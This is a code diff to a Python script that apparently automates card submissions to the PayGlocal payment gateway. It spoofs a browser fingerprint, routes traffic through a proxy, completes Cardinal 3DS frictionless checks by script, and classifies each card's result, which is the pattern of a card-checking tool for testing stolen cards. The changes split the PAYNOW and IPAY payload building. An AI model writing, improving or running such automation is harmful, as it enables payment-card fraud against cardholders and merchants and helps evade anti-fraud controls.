@@ -8,7 +8,7 @@ import time
 import uuid
 import string
 
-from client import PayGlocalClient, build_card_payload
+from client import PayGlocalClient, build_card_payload, build_ipay_payload
 from crypto import decrypt_public_key
 
 UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
@@ -166,43 +166,36 @@ def _payglocal_once(xgl: str, card: dict, proxy: str) -> tuple:
     if not rk or not key_blob:
         return "error", f"risk_fp empty: {risk.get('status')} {risk.get('message','')}"
 
-    # 3) decrypt the per-txn public key, JWE-encrypt the card payload
-    #    (userAgent must match the session's random profile UA)
+    # 3) decrypt the per-txn public key; build the browser-details block once
     pem = decrypt_public_key(key_blob, visitor_id)
-    payload = build_card_payload(card, customer_currency=issuing,
-                                 fingerprint_id=visitor_id,
-                                 browser_details={"userAgent": pg.ua,
-                                                  "screenWidth": 1920, "screenHeight": 1080,
-                                                  "colorDepth": 24, "timeZone": -330,
-                                                  "language": "en-US",
-                                                  "javaScripEnabled": True, "javaEnabled": False})
+    bd = {"userAgent": pg.ua, "screenWidth": 1920, "screenHeight": 1080,
+          "colorDepth": 24, "timeZone": -330, "language": "en-US",
+          "javaScripEnabled": True, "javaEnabled": False}
 
-    # 4) paynow (JWE) -> INPROGRESS -> (Cardinal frictionless-3DS) -> ipay (JWE)
-    pn = pg.paynow(rk, payload, pem)
+    # 4) PAYNOW (JWE) — cardData payload (NO cardinalRequest/reachData)
+    pn = pg.paynow(rk, build_card_payload(card, customer_currency=issuing,
+                                          browser_details=bd), pem)
     st = pn.get("status", "")
     if st != "INPROGRESS":
         return classify_pg_status(pn)
 
-    # 4a) Cardinal frictionless-3DS — complete it so 3DS-capable cards get a real
-    #     verdict instead of '3d' (OTP-gated cards still return '3d').
+    # 4a) Cardinal frictionless-3DS — real verdict instead of '3d'
     cardinal = ((pn.get("data") or {}).get("forms") or {}).get("Cardinal_DataCollection") or {}
     collect_url = cardinal.get("formUrl", "")
     jwt3ds = (cardinal.get("payload") or {}).get("token", "")
+    cres = ""
     if collect_url and jwt3ds:
         cres = _cardinal_frictionless(pg.session, pg.ua, proxy, collect_url, jwt3ds)
         if cres is None:
             return "3d", "3DS challenge issued (OTP required)"
-        if cres:
-            payload = build_card_payload(card, customer_currency=issuing,
-                                         fingerprint_id=visitor_id,
-                                         cardinal_request={"messageType": "CReq", "payload": cres},
-                                         browser_details={"userAgent": pg.ua, "screenWidth": 1920,
-                                                          "screenHeight": 1080, "colorDepth": 24,
-                                                          "timeZone": -330, "language": "en-US",
-                                                          "javaScripEnabled": True, "javaEnabled": False})
 
+    # 5) IPAY (JWE) — cardinalRequest + reachData payload (NO cardData)
     time.sleep(4)
-    ip = pg.ipay(rk, payload, pem)
+    ipay_payload = build_ipay_payload(card, customer_currency=issuing,
+                                      fingerprint_id=visitor_id,
+                                      browser_details=bd,
+                                      cardinal_request={"messageType": "CReq", "payload": cres} if cres else None)
+    ip = pg.ipay(rk, ipay_payload, pem)
     return classify_pg_status(ip)
 
 
